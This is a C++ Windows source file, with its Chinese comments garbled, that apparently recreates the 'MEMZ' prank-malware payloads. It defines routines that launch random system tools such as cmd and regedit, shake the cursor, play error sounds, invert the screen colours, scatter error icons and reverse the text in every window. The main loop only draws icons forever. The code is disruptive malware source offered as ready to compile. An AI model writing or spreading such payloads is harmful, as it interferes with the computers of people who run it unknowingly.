//
//main.cpp
//

#include <Windows.h>

#define         MAX_EXECUTE         8
#define         MAX_SOUNDS          3

//PlaySound������ҪWinmm.lib���ļ�
#pragma comment(lib, "Winmm.lib")

int cursor_freq = 0;
HCRYPTPROV prov;

//������Ҫ����򿪵ĳ���
LPCWSTR lpExecuteName[MAX_EXECUTE] = {
    L"calc",        //������
    L"cmd",         //������ʾ��
    L"explorer",    //��Դ������
    L"mspaint",     //��ͼ
    L"taskmgr",     //���������
    L"regedit",     //ע���
    L"write",       //д�ְ�
    L"credwiz"     //�û�����
};
//��ʾ���б�
LPCWSTR lpSoundsName[MAX_SOUNDS] = {
    L"SystemHand",
    L"SystemQuestion",
    L"SystemExclamation"
};

//���������
int random()
{
    if (prov == NULL)
        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
            ExitProcess(1);
    int out;
    CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
    return out & 0x7fffffff;
}

//���������
void PlayloadExecute()
{
    //��ȡ���洰�ڵľ��
    HWND hDesktop = GetDesktopWindow();
    //���������
    ShellExecute(hDesktop, L"open", lpExecuteName[random() % MAX_EXECUTE], NULL, NULL, SW_SHOWNORMAL);
}
//��궶��
void PlayloadCursor()
{
    //��ȡ��ǰ���λ��
    POINT cursor;
    GetCursorPos(&cursor);
    //���ù��λ��
    SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 2)));
}
//�������ʾ��Ч
void PlayloadSound()
{
    //���������ʾ��
    PlaySound(lpSoundsName[random() % MAX_SOUNDS], GetModuleHandle(NULL), SND_SYNC);
}
//��ɫ��ת
void PlayloadBlink()
{
    //��ȡ���ھ��
    HWND hDesktop = GetDesktopWindow();
    //��ȡ����dc
    HDC hdc = GetWindowDC(hDesktop);
    //��ȡ���洰����Ϣ
    RECT rekt;
    GetWindowRect(hDesktop, &rekt);
    //����Ļ��ɫ��ת
    BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
    //�ͷ�dc
    ReleaseDC(hDesktop, hdc);
}
//���ƴ���ͼ��
void PlayloadIcon()
{
    //��ȡ�����
    int iDesktopWidth = GetSystemMetrics(SM_CXSCREEN);
    //��ȡ�����
    int iDesktopHeight = GetSystemMetrics(SM_CYSCREEN);
    //��ȡ���ھ��
    HWND hDesktop = GetDesktopWindow();
    //��ȡ����dc
    HDC hdc = GetWindowDC(hDesktop);
    //��ȡ���λ��
    POINT cursor;
    GetCursorPos(&cursor);
    //�ڹ��λ�ô�������ͼ��
    DrawIcon(hdc, cursor.x - 10, cursor.y - 10, LoadIcon(NULL, IDI_ERROR));
    //����Ļ���λ�û��Ͼ���ͼ��
    if (random() % 3 == 0)       //ȡ�����,��������ܱ�3����������Ļ������λ�û�һ�������־
        DrawIcon(hdc, random() % iDesktopWidth, random() % iDesktopHeight, LoadIcon(NULL, IDI_WARNING));
}

//�ı���ת
BOOL ReverseTCHAR(TCHAR* lpSrc)
{
    //��ȡ�ַ�������
    int size = lstrlenW(lpSrc);
    //���Ϊ0�ͷ���false
    if (size == 0)
        return FALSE;

    /*
    ����һ���ַ��ȸ�ֵ����ʱ����wchar���ٽ����һ���ַ���ֵ����һ���ַ���
    ʹ��һ���ַ�������һ���ַ����ٽ�wchar����ַ���ֵ�����һ���ַ���
    �ظ��˲���ʹ�ַ�����ת
    */
    TCHAR wchar = 0;
    for (int i = 0; i < (size / 2); i++)
        // i < (size / 2) ��Ϊ�˷�ֹ���η�ת����������ø��ݸ�ֽ�Լ�дһ�·�תȫ���̾ͻ�������
    {
        wchar = lpSrc[i];
        lpSrc[i] = lpSrc[size - i - 1];
        lpSrc[size - i - 1] = wchar;
    }

    return TRUE;
}
//ö�������Ӵ��ڵĻص�����
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    TCHAR str[8192] = { 0 };
    //����WM_GETTEXT��ȡ�����ı�
    if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
        //��ת�ı�
        ReverseTCHAR(str);
        //����WM_SETTEXT�������ñ����ı�
        SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
    }

    return TRUE;
}
//���ַ�ת
void PlayloadChangeText()
{
    //ö�������Ӵ���
    EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE PrevhInstance, LPSTR lpCmdLine, int nCmdShow)
{
    while (1)
    {
        PlayloadIcon();
        Sleep(200);
    }
    return 0;
}